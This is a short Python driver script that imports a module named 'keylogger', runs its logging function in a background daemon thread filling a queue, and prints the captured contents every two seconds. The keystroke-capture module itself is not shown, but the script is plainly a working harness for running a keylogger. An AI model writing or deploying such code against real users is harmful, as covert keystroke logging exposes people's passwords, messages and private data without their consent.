from keylogger import log_to_queue as L
from keylogger import *

q = Q(20)

import threading as TH

TH.Thread(target=L,args=(q,),daemon=True).start()

while True:
    T.sleep(2)
    print(q.dump())
